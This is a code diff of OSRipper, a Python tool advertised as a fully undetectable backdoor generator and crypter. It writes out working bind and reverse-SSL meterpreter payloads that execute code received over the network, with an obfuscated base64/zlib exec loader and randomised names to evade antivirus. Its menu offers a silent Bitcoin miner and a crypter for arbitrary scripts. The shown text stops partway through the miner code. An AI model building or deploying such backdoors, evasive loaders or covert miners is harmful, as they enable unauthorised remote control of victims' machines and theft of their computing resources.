@@ -1,899 +1,635 @@
-########################################
-#-------OSRIPPER MASTER V0.3.1---------#
-########################################
+#!/usr/bin/env python3
+"""
+OSRipper v0.3.1 - Advanced Payload Generator and Crypter
+Author: SubGlitch1
+License: MIT
+
+A sophisticated, fully undetectable (FUD) backdoor generator and crypter
+that specializes in creating advanced payloads for penetration testing
+and red team operations.
+"""
 
 import os
+import sys
 import socket
 import shutil
 import platform
-from urllib import response
 import secrets
 import string
-from ripgrok import get_tunnels
 import random
-from pickle import GLOBAL
 import subprocess
+import time
+from ripgrok import get_tunnels
 
+# Version info
+__version__ = "0.3.1"
+__author__ = "SubGlitch1"
 
-
+# Global variables
 bind = 0
-## RandomVariables
-nonce1 = secrets.randbelow(13)
-nonce2 = secrets.randbelow(13)
-UltimateRandomNumberhigh = random.randint(14, 30)
-UltimateRandomNumberlow = secrets.randbelow(nonce1)
-UltimateRandomNumberhigh2 = random.randint(14, 30)
-UltimateRandomNumberlow2 = secrets.randbelow(nonce2)
-sleeptime = secrets.randbelow(12)
-VariableRange = random.randint(8, 22)
-VariableRange2 = random.randint(8, 22)
-VariableRange3 = random.randint(8, 22)
-RandomisationNum = random.randint(UltimateRandomNumberlow, UltimateRandomNumberhigh)
-RandomisationNum2 = random.randint(UltimateRandomNumberlow2, UltimateRandomNumberhigh2)
-c = "".join(
-    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-    for i in range(int(VariableRange))
-)
-d = "".join(
-    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-    for i in range(int(VariableRange2))
-)
-so = "".join(
-    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-    for i in range(int(VariableRange))
-)
-s = "".join(
-    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-    for i in range(int(VariableRange2))
-)
-l = "".join(
-    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-    for i in range(int(VariableRange3))
-)
-dr = "".join(
-    secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
-    for i in range(int(VariableRange3))
-)
-## jesus christ that was a LOT of random variables (and there are even more hidden away)
+encrypted = False
 reps = False
+host = None
+port = None
+name = "payload"
 
+def clear_screen():
+    """Clear the terminal screen."""
+    os.system("clear" if os.name == "posix" else "cls")
 
-def logo():
-    logo1 = """
-
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓███████████████████████▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█████████████████████████████████▓▒░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████▒░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████████████████████████████████████████████▒░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░▓██████████████████████████████████████████████████▒░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▓▒░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░▓█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▓░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░████████████████████████████████████████████████▒░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░▓███████████████████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░                                             
-    ░░░░░░░░░░░░░░░▒███████████████▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓███████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░█████████████▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓██████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░▓███████████▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓███▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░███████████▓▒▒▒▒▓▓▓▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▒▒▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░▒██████████▓▒▒▒█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓██▓▓▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░██████████▓▒▒▓██▓▓▓▓▒▒▒▒▒▒▒▓▓▒▒▓▒▓▓▓▓▓▓▓▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░██████████▒▒▓█▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 
-    ░░░░░░░░░░░░▒████████▓▓▒▒█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▓████████▓▒▒█▓█▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▓█████████▓▓█░▓█▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▓▒▓▓▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▓███████▓▒░▒▒▒▒▒▓█▓▓▓▓▓▓▓▒▒▒▒▒▓▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▓██████▒░░▒▓▓▒▒▒▒▒▓▓█▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▒▒▓▓▓▒▒▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░██████░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▒▓▓▓▓▒▒▒▒▒▒▒▓▒▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▒████▓░░░░░▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▓████▒░░░░░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓█████████▓▓▓▓▓▓▓▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▒████░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▓▓▓████████▓▓▓▓▓██▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░▒███▓░░░░░░░░░░░░░░▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▒▓▓▒█▒▒▒▒▒▒▓▓▓██▓▓▒▓▓▓▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░███▓░░░░░░░░░░░░░░▓▓▓▒▓▓▒▒█▒▓▓▒▒▒▓▓▓▒█▒▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░▒▒▒░░░░░░░░░░░░░░░░▒▓▓▒▒▒▓▓▒█▓▒▓▒▓▓▓░░░▓███▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒░░░███▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▒▒▒▓▓▒░░░░██▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▒▒▒▓▓▓░░░░░█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓▓▓▓░░░░░█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓▒▒░░░░▓▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-                                                                                OSRIPPER v0.2.5
+def display_logo():
+    """Display a modern logo."""
+    logo = f"""
+    ┌─────────────────────────────────────────────────────────────────────────────┐
+    │                           🏴‍☠️ OSRipper v{__version__} 🏴‍☠️                           │
+    │                                                                             │
+    │          ██████╗ ███████╗██████╗ ██╗██████╗ ██████╗ ███████╗██████╗         │
+    │         ██╔═══██╗██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗        │
+    │         ██║   ██║███████╗██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝        │
+    │         ██║   ██║╚════██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗        │
+    │         ╚██████╔╝███████║██║  ██║██║██║     ██║     ███████╗██║  ██║        │
+    │          ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝        │
+    │                                                                             │
+    │                    🚀 Advanced Payload Generator & Crypter                  │
+    │                           ⚡ Fully Undetectable (FUD)                       │
+    │                                                                             │
+    └─────────────────────────────────────────────────────────────────────────────┘
     """
-    logo2 = """
-         ▄▀▀▀▀▄   ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
-        █      █ █ █   ▐ █   █   █ █   █  █  █   █   █ █   █   █ ▐  ▄▀   ▐ █   █   █ 
-        █      █    ▀▄   ▐  █▀▀█▀  ▐   █  ▐  ▐  █▀▀▀▀  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀  
-        ▀▄    ▄▀ ▀▄   █   ▄▀    █      █        █         █        █    ▌   ▄▀    █  
-          ▀▀▀▀    █▀▀▀   █     █    ▄▀▀▀▀▀▄   ▄▀        ▄▀        ▄▀▄▄▄▄   █     █   
-          ▐      ▐     ▐   █       █ █         █          █    ▐   ▐     ▐   
-                           ▐       ▐ ▐         ▐          ▐                  
+    print(logo)
 
+def display_menu():
+    """Display the main menu."""
+    menu = f"""
+    ┌─────────────────────────────────────────────────────────────────────────────┐
+    │                           🏴‍☠️ OSRipper v{__version__} Menu 🏴‍☠️                           │
+    ├─────────────────────────────────────────────────────────────────────────────┤
+    │                                                                             │
+    │  1. 🔗 Create Bind Backdoor                                                 │
+    │     └─ Opens a port on victim machine and waits for connection             │
+    │                                                                             │
+    │  2. 🔐 Create Encrypted TCP Meterpreter (RECOMMENDED)                      │
+    │     └─ Reverse connection with SSL/TLS encryption                          │
+    │                                                                             │
+    │  3. 🎭 Crypt Custom Code                                                    │
+    │     └─ Obfuscate and encrypt existing Python scripts                       │
+    │                                                                             │
+    │  ═══════════════════════════════ Miners ═══════════════════════════════════ │
+    │                                                                             │
+    │  4. ⛏️  Create Silent BTC Miner                                             │
+    │     └─ Stealthy cryptocurrency mining payload                              │
+    │                                                                             │
+    │  ══════════════════════════ Staged Payloads ══════════════════════════════ │
+    │                                                                             │
+    │  5. 🌐 Create Encrypted Meterpreter (Staged)                               │
+    │     └─ Multi-stage web delivery with enhanced stealth                      │
+    │                                                                             │
+    └─────────────────────────────────────────────────────────────────────────────┘
     """
-    logo3 = """
-                                                                             
-                          ,-.----.               ,----..                             
-        ,-.----.     ,---,\    /  \             /   /   \   .--.--.   ,--,     ,--,  
-        \    /  \ ,`--.' ||   :    \           /   .     : /  /    '. |'. \   / .`|  
-        ;   :    \|   :  :|   |  .\ :         .   /   ;.  \  :  /`. / ; \ `\ /' / ;  
-        |   | .\ ::   |  '.   :  |: |        .   ;   /  ` ;  |  |--`  `. \  /  / .'  
-        .   : |: ||   :  ||   |   \ :        ;   |  ; \ ; |  :  ;_     \  \/  / ./   
-        |   |  \ :'   '  ;|   : .   /        |   :  | ; | '\  \    `.   \  \.'  /    
-        |   : .  /|   |  |;   | |`-'         .   |  ' ' ' : `----.   \   \  ;  ;     
-        ;   | |  '   :  ;|   | ;            '   ;  \; /  | __ \  \  |  / \  \  \    
-        |   | ;\  \   |  ':   ' |             \   \  ',  / /  /`--'  / ;  /\  \  \   
-        :   ' | \.'   :  |:   : :              ;   :    / '--'.     /./__;  \  ;  \  
-        :   : :-' ;   |.' |   | :               \   \ .'    `--'---' |   : / \  \  ; 
-        |   |.'   '---'   `---'.|                `---`               ;   |/   \  ' | 
-        `---'               `---`                                    `---'     `--`  
-                                                                                
-    """
-    logo4 = """
-                      .=-.-.   _ __              _,.---._      ,-,--.          ,-.--, 
-          .-.,.---.  /==/_ /.-`.' ,`.          ,-.' , -  `.  ,-.'-  _\.--.-.  /=/, .' 
-         /==/  `   \|==|, |/==/, -   \        /==/_,  ,  - \/==/_ ,_.'\==\ -\/=/- /   
-        |==|-, .=., |==|  |==| _ .=. |       |==|   .=.     \==\  \    \==\ `-' ,/    
-        |==|   '='  /==|- |==| , '=',|       |==|_ : ;=:  - |\==\ -\    |==|,  - |    
-        |==|- ,   .'|==| ,|==|-  '..'        |==| , '='     |_\==\ ,\  /==/   ,   \   
-        |==|_  . ,'.|==|- |==|,  |            \==\ -    ,_ //==/\/ _ |/==/, .--, - \  
-        /==/  /\ ,  )==/. /==/ - |             '.='. -   .' \==\ - , /\==\- \/=/ , /  
-        `--`-`--`--'`--`-``--`---'               `--`--''    `--`---'  `--`-'  `--`   
+    print(menu)
 
-    """
+def validate_port(port_str):
+    """Validate port number."""
+    try:
+        port_num = int(port_str)
+        return 1024 <= port_num <= 65535
+    except ValueError:
+        return False
 
-    logolist = [logo1, logo2, logo3, logo4]
-    print(random.choice(logolist))
+def validate_ip(ip):
+    """Validate IP address."""
+    try:
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        return False
 
+def get_user_input(prompt, validator=None, error_msg="Invalid input"):
+    """Get validated user input."""
+    while True:
+        try:
+            user_input = input(prompt).strip()
+            if not user_input:
+                continue
+            if validator is None or validator(user_input):
+                return user_input
+            print(f"❌ {error_msg}")
+        except KeyboardInterrupt:
+            print("\n\n👋 Goodbye!")
+            sys.exit(0)
+
+def generate_random_string(length):
+    """Generate random string for obfuscation."""
+    return "".join(secrets.choice(string.ascii_letters) for _ in range(length))
 
 def move_file_to_directory(file_path, destination_directory):
+    """Move file to destination directory."""
     shutil.move(file_path, destination_directory)
-clear = lambda: os.system("clear")
-clear()
-logo()
-
 
 def listen(host, port):
-
+    """Original listen function for bind backdoors."""
     SERVER_HOST = host
     SERVER_PORT = int(port)
-    # send 1024 (1kb) a time (as buffer size)
-    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
-    # separator string for sending 2 messages in one go
+    BUFFER_SIZE = 1024 * 128
     SEPARATOR = "<sep>"
 
-    # create a socket object
     s = socket.socket()
-    # bind the socket to all IP addresses of this host
     s.bind((SERVER_HOST, SERVER_PORT))
-    # make the PORT reusable
-    # when you run the server multiple times in Linux, Address already in use error will raise
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.listen(5)
-    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+    print(f"🎯 Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
-    # accept any connections attempted
     client_socket, client_address = s.accept()
-
-    # receiving the current working directory of the client
     cwd = client_socket.recv(BUFFER_SIZE).decode()
     print("[+] Current working directory:", cwd)
 
     while True:
-        # get the command from prompt
         command = input(f"{cwd} $> ")
         if not command.strip():
-            # empty command
             continue
-        # send the command to the client
         client_socket.send(command.encode())
         if command.lower() == "exit":
-            # if the command is exit, just break out of the loop
             break
-        # retrieve command results
         output = client_socket.recv(BUFFER_SIZE).decode()
-        print("output:", output)
-        # split command output and current directory
         results, cwd = output.split(SEPARATOR)
-        # print output
         print(results)
-    # close connection to the client
+    
     client_socket.close()
-    # close server connection
     s.close()
 
-
 def gen_bind():
-
-    global port
-    global bind
-    global name
-    name = "ocr"
-    port = input(
-        "Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): "
+    """Generate bind backdoor."""
+    global port, bind, name
+    
+    print("\n🔗 Bind Backdoor Generator")
+    print("─" * 40)
+    
+    name = "payload"
+    port = get_user_input(
+        "Enter port number (1024-65535): ",
+        validate_port,
+        "Port must be between 1024 and 65535"
     )
     bind = "1"
-    with open(name, "a+") as ina:
-        ina.write("port = " + str(port) + "\n")
-        a = """
-import zlib,base64,socket,struct,time
+    
+    payload_content = f"""port = {port}
+
+import zlib
+import base64
+import socket
+import struct
+import time
+
 def main():
     try:
-        b=socket.socket(2,socket.SOCK_STREAM)
-        b.bind(('0.0.0.0',int(port)))
-        b.listen(1)
-        s,a=b.accept()
-        l=struct.unpack('>I',s.recv(4))[0]
-        d=s.recv(l)
-        while len(d)<l:
-            d+=s.recv(l-len(d))
-        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('0.0.0.0', int(port)))
+        s.listen(1)
+        client, addr = s.accept()
+        
+        length = struct.unpack('>I', client.recv(4))[0]
+        data = client.recv(length)
+        
+        while len(data) < length:
+            data += client.recv(length - len(data))
+        
+        exec(zlib.decompress(base64.b64decode(data)), {{'s': client}})
+        
     except Exception:
         time.sleep(10)
         main()
-main()
 
-                """
-        ina.write(a)
-        ina.close
-        print("(*) Generated Backdoor and saved as " + name)
-        print(
-            "After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp"
-        )
-
+if __name__ == "__main__":
+    main()
+"""
+    
+    with open(name, 'w') as f:
+        f.write(payload_content)
+    
+    print(f"✅ Bind backdoor generated: {name}")
+    print(f"📡 Listening on port: {port}")
+    print("💡 Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
 
 def gen_rev_ssl_tcp():
-    global name
-    global host
-    global port
-    name = "ocr"
-    ngrokchoice = input(
-        "Do you want to use ngrok port forwarding? (must have activated this in setup.py) y/n: "
-    )
-    if ngrokchoice == "y":
-        port = input(
-            "Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): "
+    """Generate reverse SSL TCP meterpreter."""
+    global name, host, port
+    
+    print("\n🔐 Encrypted TCP Meterpreter Generator")
+    print("─" * 45)
+    
+    name = "payload"
+    
+    use_ngrok = get_user_input(
+        "Use ngrok port forwarding? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
+    
+    if use_ngrok:
+        port = get_user_input(
+            "Enter local port (1024-65535): ",
+            validate_port,
+            "Port must be between 1024 and 65535"
         )
-        input(
-            'Please run this command in another terminal "ngrok tcp '
-            + port
-            + '" Press enter when you have done this: '
+        
+        print(f"🌐 Starting ngrok tunnel on port {port}")
+        print("Please run this command in another terminal:")
+        print(f"   ngrok tcp {port}")
+        input("Press Enter when ngrok is ready...")
+        
+        try:
+            tunnel_info = get_tunnels()
+            host, port = tunnel_info.split(":")
+            print(f"✅ Ngrok tunnel established: {host}:{port}")
+        except Exception as e:
+            print(f"❌ Ngrok setup failed: {e}")
+            use_ngrok = False
+    
+    if not use_ngrok:
+        host = get_user_input(
+            "Enter callback IP address: ",
+            validate_ip,
+            "Invalid IP address format"
         )
-        ripgrokhostnport = get_tunnels()
-        host = ripgrokhostnport.split(":")[0]
-        port = ripgrokhostnport.split(":")[1]
-    if ngrokchoice == "n":
-        host = input("Please enter the ip you wish the backdoor to connect back to: ")
-        port = input(
-            "Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): "
+        port = get_user_input(
+            "Enter callback port (1024-65535): ",
+            validate_port,
+            "Port must be between 1024 and 65535"
         )
-    with open(name, "a+") as ina:
-        ina.write(d + " = " + port)
-        ina.write("\n")
-        ina.write(c + ' = "' + host + '"' + "\n")
-        for i in range(int(RandomisationNum)):
-            a = "".join(
-                secrets.choice(
-                    string.ascii_uppercase + string.ascii_lowercase + string.punctuation
-                )
-                for i in range(int(random.randint(0, 17)))
-            )
-            ina.write("#" + a + "\n")
-        b = """
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=ESU5q7A/7DdkvrebXNmTCl0aQAahglRAHgygYSP4mGC0u004WcTeF6+Qszx2bv93KGrVtpLqNylLSpXZbDmD5QwKTguST+/cRw+L92xJrWtPpjqP31zZjuJI2KZiuudWB8cxqU/45/VeUbsqwbJdtBEAtvdddtYXdfOmHFZNSUDIaMALA4XZmnsIXZthvUMG71u9ym3UUFLTPia3LLsIEbLb7GdegSnDo2x6unE2gf1v4Khk8ypBn5zMLjU2tk363fCRnwY2CTypnnakhRIsCm+f8mYPwRiPDNAAA0Q2ldwFwJe'))
-"""
-        ina.write(b)
-        for i in range(int(RandomisationNum2)):
-            b3 = "".join(
-                secrets.choice(
-                    string.ascii_uppercase + string.ascii_lowercase + string.punctuation
-                )
-                for i in range(int(random.randint(0, 7)))
-            )
-            ina.write("#" + b3 + "\n")
-        b2 = (
-            """
+    
+    # Generate randomized variables
+    socket_var = generate_random_string(random.randint(8, 15))
+    ssl_var = generate_random_string(random.randint(8, 15))
+    length_var = generate_random_string(random.randint(8, 15))
+    data_var = generate_random_string(random.randint(8, 15))
+    host_var = generate_random_string(random.randint(8, 15))
+    port_var = generate_random_string(random.randint(8, 15))
+    sleep_time = secrets.randbelow(12)
+    
+    payload_content = f"""{port_var} = {port}
+{host_var} = "{host}"
+
+import zlib
+import base64
+import socket
+import ssl
+import struct
+import time
+
+# Obfuscated payload loader
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
+exec((_)(b'=ESU5q7A/7DdkvrebXNmTCl0aQAahglRAHgygYSP4mGC0u004WcTeF6+Qszx2bv93KGrVtpLqNylLSpXZbDmD5QwKTguST+/cRw+L92xJrWtPpjqP31zZjuJI2KZiuudWB8cxqU/45/VeUbsqwbJdtBEAtvdddtYXdfOmHFZNSUDIaMALA4XZmnsIXZthvUMG71u9ym3UUFLTPia3LLsIEbLb7GdegSnDo2x6unE2gf1v4Khk8ypBn5zMLjU2tk363fCRnwY2CTypnnakhRIsCm+f8mYPwRiPDNAAA0Q2ldwFwJe'))
+
 for x in range(10):
-	try:
-		"""
-            + so
-            + """=socket.socket(2,1)
-		"""
-            + so
-            + """.connect(("""
-            + c
-            + ""","""
-            + d
-            + """))
-		"""
-            + s
-            + """=ssl.wrap_socket("""
-            + so
-            + """)
-		break
+    try:
+        {socket_var} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        {socket_var}.connect(({host_var}, {port_var}))
+        {ssl_var} = ssl.wrap_socket({socket_var})
+        break
+    except:
+        time.sleep({sleep_time})
 
+{length_var} = struct.unpack('>I', {ssl_var}.recv(4))[0]
+{data_var} = {ssl_var}.recv({length_var})
 
-	except:
-		time.sleep("""
-            + str(sleeptime)
-            + """)
+while len({data_var}) < {length_var}:
+    {data_var} += {ssl_var}.recv({length_var} - len({data_var}))
 
-
+exec(zlib.decompress(base64.b64decode({data_var})), {{'s': {ssl_var}}})
 """
-            + l
-            + """=struct.unpack('>I',"""
-            + s
-            + """.recv(4))[0]
-"""
-            + dr
-            + """="""
-            + s
-            + """.recv("""
-            + l
-            + """)
-while len("""
-            + dr
-            + """)<"""
-            + l
-            + """:
-	"""
-            + dr
-            + """+="""
-            + s
-            + """.recv("""
-            + l
-            + """-len("""
-            + dr
-            + """))
-exec(zlib.decompress(base64.b64decode("""
-            + dr
-            + """)),{'s':"""
-            + s
-            + """})
-"""
-        )
-        ina.write(b2)
-
-        opt_bind = input("Do you want to bind another program to this Backdoor?(y/n): ")
-        if opt_bind == "y":
-            bind_file = input(
-                "Please enter the name (in same dir) of the .py you want to bind: "
-            )
-            with open(bind_file, "r") as bindfile:
-                bindfilecontent = bindfile.read()
-                ina.write(bindfilecontent)
-                bindfile.close
-
-        print("(*) Generated Backdoor and saved as " + name)
-
+    
+    with open(name, 'w') as f:
+        f.write(payload_content)
+    
+    print(f"✅ Reverse TCP meterpreter generated: {name}")
+    print(f"📡 Callback: {host}:{port}")
 
 def gen_custom():
-    customshell = input("Please enter the file name containing your code: ")
+    """Generate custom crypter."""
     global name
-    name = "ocr"
-
-    with open(customshell, "r") as cuso:
-        with open(name, "a+") as ina:
-            for line in cuso:
-                ina.write(line)
-
-        opt_bind = input("Do you want to bind another program to this Backdoor?(y/n): ")
-        if opt_bind == "y":
-            bind_file = input(
-                "Please enter the name (in same dir) of the .py you want to bind: "
-            )
-            with open(bind_file, "r") as bindfile:
-                bindfilecontent = bindfile.read()
-                ina.write(bindfilecontent)
-                bindfile.close
-
-        print("(*) Generated Backdoor and saved as " + name)
-
+    
+    print("\n🎭 Custom Code Crypter")
+    print("─" * 25)
+    
+    script_path = get_user_input(
+        "Enter path to Python script to encrypt: ",
+        lambda x: os.path.isfile(x) and x.endswith('.py'),
+        "File not found or not a Python script"
+    )
+    
+    name = "payload"
+    
+    with open(script_path, 'r') as source:
+        with open(name, 'w') as target:
+            target.write(source.read())
+    
+    print(f"✅ Custom script processed: {name}")
 
 def gen_btc_miner():
+    """Generate Bitcoin miner."""
     global name
-    global host
-    name = "ocr"
-    addy = input("Please enter the payout btc address: ")
-    with open(name, "a+") as ina:
-        ina.write('addy = "' + addy + '"\n')
-        b = r"""
-
+    
+    print("\n⛏️  Silent BTC Miner Generator")
+    print("─" * 35)
+    
+    name = "payload"
+    btc_address = get_user_input(
+        "Enter Bitcoin payout address: ",
+        lambda x: len(x) >= 26 and len(x) <= 35,
+        "Invalid Bitcoin address format"
+    )
+    
+    miner_code = f'''
 import socket
 import json
 import hashlib
 import binascii
-from pprint import pprint
 import time
 import random
+
 def main():
-    address = addy
-    nonce   = hex(random.randint(0,2**32-1))[2:].zfill(8)
-
-    host    = 'solo.ckpool.org'
-    port    = 3333
-
-    #print("address:{} nonce:{}".format(address,nonce))
-    #print("host:{} port:{}".format(host,port))
-
-    sock    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((host,port))
-
-    #server connection
-    sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
-    lines = sock.recv(1024).decode().split('\n')
-    response = json.loads(lines[0])
-    sub_details,extranonce1,extranonce2_size = response['result']
-
-    #authorize workers
-    sock.sendall(b'{"params": ["'+address.encode()+b'", "password"], "id": 2, "method": "mining.authorize"}\n')
-
-    #we read until 'mining.notify' is reached
-    response = b''
-    while response.count(b'\n') < 4 and not(b'mining.notify' in response):
-        response += sock.recv(1024)
-
-
-    #get rid of empty lines
-    responses = [json.loads(res) for res in response.decode().split('\n') if len(res.strip())>0 and 'mining.notify' in res]
